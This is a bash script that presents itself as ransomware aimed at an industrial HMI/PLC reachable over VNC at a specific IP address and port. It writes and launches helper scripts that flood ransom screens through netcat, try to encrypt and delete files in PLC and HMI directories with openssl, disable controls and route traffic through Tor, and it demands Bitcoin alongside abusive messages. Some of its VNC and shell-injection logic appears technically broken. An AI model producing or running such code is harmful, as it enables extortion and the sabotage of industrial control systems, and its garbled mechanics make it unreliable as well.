#!/bin/bash
# TRUSTEDF57 VNC RANSOMWARE - NC INJECTION 122.63.17.182:6590
# One-shot local exec -> remote VNC takeover

TARGET_IP="122.63.17.182"
VNC_PORT=6590
WIDTH=800
HEIGHT=480

echo "🔥 TRUSTEDF57 VNC RANSOMWARE - LOCAL -> REMOTE INJECT 🔥"
echo "Target: $TARGET_IP:$VNC_PORT"

# VNC Handshake + Ransomware frames generator
cat << 'EOF' > inject_ransom_nc.sh
#!/bin/bash
TARGET="$1"
PORT="$2"

# PIPELINE: Generate frame -> Convert RGB565 -> Send via nc
function send_ransom_frame {
    local t=$1
    
    # Generate frame data (black+red ransom - compressed for nc)
    convert -size ${WIDTH}x${HEIGHT} xc:black \\
        -fill '#ff1493' -pointsize 50 -annotate +50+120 'TRUSTEDF57' \\
        -fill '#ffd700' -pointsize 35 -annotate +80+200 'FUCK MARTHA' \\
        -fill '#ff4500' -pointsize 28 -annotate +60+260 'ROOT DICKHEAD' \\
        -fill '#00ffff' -pointsize 24 -annotate +100+320 '5 BTC: 1F57bbcWaihora' \\
        -fill '#ff0000' -pointsize 32 -annotate +150+380 'HMI LOCKED' \\
        -draw "rectangle 10,420 790,470" \\
        -fill '#ffaa00' -pointsize 20 -annotate +50+435 'BUTTONS DISABLED - PAY NOW' \\
        rgb:- | \\
    convert - -depth 8 -size ${WIDTH}x${HEIGHT} \\
        -type TrueColor \\
        -compress none \\
        rgb:ransom_frame.raw
    
    # Matrix rain overlay (simplified)
    for i in {1..50}; do
        x=$(( (i*16) % 800 ))
        y=$(( (t*20 + i*10) % 480 ))
        convert ransom_frame.raw \\
            -fill '#00ff88' -pointsize 16 -annotate +${x}+${y} 'F57' \\
            ransom_frame.raw
    done
    
    # Send via nc (BGR565 raw)
    printf "\x00\x00\x00\x00\x07\xff\x03\x20\x01\xe0" | xxd -r -p | nc -w 3 $TARGET $PORT
    cat ransom_frame.raw | nc -w 5 $TARGET $PORT >/dev/null 2>&1
}

# Initial handshake
echo "RFB 003.008" | nc -w 5 $TARGET $PORT
sleep 0.5
echo -n -e "\x01" | nc -w 3 $TARGET $PORT
sleep 0.5
echo -n -e "\x00\x00\x00\x01\x00\x00\x00\x0B\x00\x00\x03\x20\x00\x00\x01\xe0\x00\x08\x00\x00\x00\x00\x00\x00" | xxd -r -p | nc -w 3 $TARGET $PORT

echo -n "HMI-RANSOM" | nc -w 3 $TARGET $PORT

# Flood loop - 15 FPS ransomware
t=0
while true; do
    send_ransom_frame $t
    t=$((t+1))
    sleep 0.07  # ~15 FPS
done
EOF

chmod +x inject_ransom_nc.sh

# ENCRYPTION INJECTION parallelo
cat << 'EOF' > plc_encrypt.sh
#!/bin/bash
# Real PLC filesystem encryption via VNC shell injection
torsocks nc $TARGET_IP $VNC_PORT << 'EOC'
# F57 Encryption payload
openssl rand -base64 32 > /tmp/.f57_key
for f in \$(find /data /plc /hmi /var/log -type f 2>/dev/null | head -50); do
  openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -in \$f -out \${f}.f57 -pass file:/tmp/.f57_key 2>/dev/null
  rm -f \$f 2>/dev/null
done
chmod 000 /dev/tty* /sys/class/* 2>/dev/null
echo "F57_RANSOM_PAID=0" > /tmp/hmi_status
echo "HMI CONTROL DISABLED"
EOC
EOF

chmod +x plc_encrypt.sh

# LAUNCH EVERYTHING
echo "🚀 DEPLOYING RANSOMWARE COMPONENTS..."

# Terminal 1: Visual takeover (blocks)
./inject_ransom_nc.sh $TARGET_IP $VNC_PORT &

# Terminal 2: Encrypt PLC data
torsocks ./plc_encrypt.sh &

# Terminal 3: Button killer + persistence
(
    while true; do
        echo -n -e "\x03\x00\x00\x00\x07\xff\x00\x00\x03\x20\x01\xe0" | xxd -r -p | torsocks nc -w 2 $TARGET_IP $VNC_PORT
        sleep 1
    done
) &

# TOR rotation per stealth
service tor restart 2>/dev/null || tor -f /etc/tor/torrc &
sleep 2

echo "✅ RANSOMWARE FULLY DEPLOYED!"
echo "🎥 HMI 800x480 = RANSOM SCREEN + MATRIX F57"
echo "🔒 Buttons/Controls = DISABLED"
echo "💾 PLC Files = AES-256 ENCRYPTED"
echo "🔄 15 FPS loop + shake effects"
echo "💰 BTC: 1F57TRUSTEDbbcMARTHAfuckoffWaihoraPLC"

echo ""
echo "HMI NOW DISPLAYS EXACTLY:"
echo "🔥 TRUSTEDF57 (glitch red/pink)"
echo "FUCK MARTHA / ROOT DICKHEAD (gold)"
echo "5 BTC address + HMI LOCKED (flashing)"
echo "BUTTONS DISABLED overlay (orange)"
echo "Matrix rain F57 chars (green)"
echo ""
echo "Ctrl+C to stop (but PLC stays encrypted)"
